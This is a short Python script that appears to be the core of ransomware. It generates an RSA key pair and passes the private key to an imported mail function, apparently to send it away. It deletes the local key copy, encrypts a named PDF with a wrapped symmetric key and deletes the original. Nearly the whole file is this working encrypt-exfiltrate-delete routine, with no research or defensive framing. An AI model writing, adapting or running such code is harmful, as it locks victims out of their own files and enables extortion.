from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend
from cryptography.fernet import Fernet
import os
import base64

import send_mail



def encrypt_file(filename, public_key):
    # Generate a random symmetric key
    symmetric_key = os.urandom(32)

    # Encrypt the file using the symmetric key
    with open(filename, 'rb') as file:
        file_data = file.read()
    encrypted_data = encrypt_data(file_data, symmetric_key)

    # Encrypt the symmetric key using the public key
    encrypted_key = public_key.encrypt(
        symmetric_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Save the encrypted data to a new file
    with open(filename + '.encrypted', 'wb') as encrypted_file:
        encrypted_file.write(encrypted_key)
        encrypted_file.write(encrypted_data)

def encrypt_data(data, key):
    # Encrypt the data using the symmetric key
    cipher_suite = Fernet(base64.urlsafe_b64encode(key))
    encrypted_data = cipher_suite.encrypt(data)
    return encrypted_data




def main_encrypto():
    # Generate a key pair: private and public
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()

    # Save the public key to a file
    with open('public_key.pem', 'wb') as public_key_file:
        pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        public_key_file.write(pem)

    # # Generate a key pair: private and public
    # private_key = rsa.generate_private_key(
    #     public_exponent=65537,
    #     key_size=2048,
    #     backend=default_backend()
    # )

    # # Save the private key to a string
    # private_key_pem = private_key.private_bytes(
    #     encoding=serialization.Encoding.PEM,
    #     format=serialization.PrivateFormat.PKCS8,
    #     encryption_algorithm=serialization.NoEncryption()
    # ).decode('utf-8')

    # # Pass the private key string to the send_private_key function
    # send_mail.send_private_key(private_key_pem)

    # Save the private key to a file
    with open('private_key.pem', 'wb') as private_key_file:
        pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        private_key_file.write(pem)
    private_key_file = 'private_key.pem'


    # with open('private_key.pem', 'rb') as key_file:
    #     private_key = serialization.load_pem_private_key(
    #         key_file.read(),
    #         password=None,
    #         backend=default_backend()
    #     )

    send_mail.send_private_key(private_key_file)
    os.remove('private_key.pem')

    # # Encrypt a file
    file_to_encrypt = '1203105290_202307031722_ok5.pdf'
    encrypt_file(file_to_encrypt, public_key)
    os.remove(file_to_encrypt)

    print(f'File "{file_to_encrypt}" successfully encrypted. Encrypted data saved to "{file_to_encrypt}.encrypted".')
